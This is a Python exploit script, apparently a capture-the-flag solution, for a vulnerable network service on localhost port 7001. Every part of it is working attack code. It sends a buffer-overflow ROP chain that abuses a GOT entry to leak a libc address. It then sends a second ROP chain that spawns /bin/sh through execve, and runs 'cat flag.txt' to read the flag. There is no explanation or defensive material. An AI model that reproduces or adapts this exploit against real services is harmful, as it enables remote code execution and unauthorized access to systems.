from struct import pack
import socket
import sys

p = lambda x : pack('Q', x)
host = "localhost"
port = 7001
write_disp = 0xf8
# obtained with:
# ropper -f /lib/x86_64-linux-gnu/libc.so.6 --chain "execve cmd=/bin/sh"

def rop_chain(libc):

	rebase_0 = lambda x : p(x + libc)

	rop = b'A'*40
	rop += rebase_0(0x000000000002911d) # 0x000000000002911d: pop r13; ret; 
	rop += b'//bin/sh'
	rop += rebase_0(0x00000000000331ff) # 0x00000000000331ff: pop rbx; ret; 
	rop += rebase_0(0x00000000001eb1a0)
	rop += rebase_0(0x0000000000064075) # 0x0000000000064075: mov qword ptr [rbx], r13; pop rbx; pop rbp; pop r12; pop r13; ret; 
	rop += p(0xdeadbeefdeadbeef)
	rop += p(0xdeadbeefdeadbeef)
	rop += p(0xdeadbeefdeadbeef)
	rop += p(0xdeadbeefdeadbeef)
	rop += rebase_0(0x000000000002911d) # 0x000000000002911d: pop r13; ret; 
	rop += p(0x0000000000000000)
	rop += rebase_0(0x00000000000331ff) # 0x00000000000331ff: pop rbx; ret; 
	rop += rebase_0(0x00000000001eb1a8)
	rop += rebase_0(0x0000000000064075) # 0x0000000000064075: mov qword ptr [rbx], r13; pop rbx; pop rbp; pop r12; pop r13; ret; 
	rop += p(0xdeadbeefdeadbeef)
	rop += p(0xdeadbeefdeadbeef)
	rop += p(0xdeadbeefdeadbeef)
	rop += p(0xdeadbeefdeadbeef)
	rop += rebase_0(0x0000000000026b72) # 0x0000000000026b72: pop rdi; ret; 
	rop += rebase_0(0x00000000001eb1a0)
	rop += rebase_0(0x0000000000027529) # 0x0000000000027529: pop rsi; ret; 
	rop += rebase_0(0x00000000001eb1a8)
	rop += rebase_0(0x000000000011c371) # 0x000000000011c371: pop rdx; pop r12; ret; 
	rop += rebase_0(0x00000000001eb1a8)
	rop += p(0xdeadbeefdeadbeef)
	rop += rebase_0(0x000000000004a550) # 0x000000000004a550: pop rax; ret; 
	rop += p(0x000000000000003b)
	rop += rebase_0(0x0000000000066229) # 0x0000000000066229: syscall; ret; 

	return rop

def get_got():

	# write offset - setsockopt offset, 
	# setsosckopt is located at greater offset w.r.t to write, so
	# in order to obtain the address of write() function in the setsockopt
	# GOT entry it is necessary to fcause an overlap inserting in %rdi the
	# 2-complement representaion of the opposite of 0X1238a0 - 0x1111d0.
	# Addresses obtained respectively with
	# 1)nm -D /lib/x86_64-linux-gnu/libc.so.6 | grep '\<setsockopt\>'
	# 2)nm -D /lib/x86_64-linux-gnu/libc.so.6 | grep '\<write\>'

	write_wraparound	= p(0xfffffffffffed930) 
	pop_rdi				= p(0x400b0b)
	pop_rsi_r15			= p(0x400b09)
	got 				= p(0x600ef8)
	add_PTR_r15_rdi 	= p(0x4008ca)
	setsockopt_plt		= p(0x4006d0)


	o = b'A'*40
	o += pop_rdi
	o += write_wraparound 
	o += pop_rsi_r15
	o += p(0x600ef8 - write_disp)
	o += got
	o += add_PTR_r15_rdi
	o += pop_rdi
	o += p(1)
	o += setsockopt_plt

	s = socket.create_connection((host, port))
	s.send(o)
	g = s.recv(0x200)
	s.close()
	return g

def get_libc():
	got = get_got()
	setsockopt_addr = int.from_bytes(got[write_disp: write_disp + 8], 'little')
	print("setsockopt address: %x" % setsockopt_addr )
	print("libc: %x" % (setsockopt_addr - 0x1111d0))
	return setsockopt_addr - 0x1111d0

def main():
	libc = get_libc()
	
	s = socket.create_connection((host, port))
	rop = rop_chain(libc)
	s.send(rop + b"A"*(512 - len(rop)))
	s.send(b"cat flag.txt\x0a")
	print(s.recv(128))
	s.close()


if __name__ == '__main__':
	main()



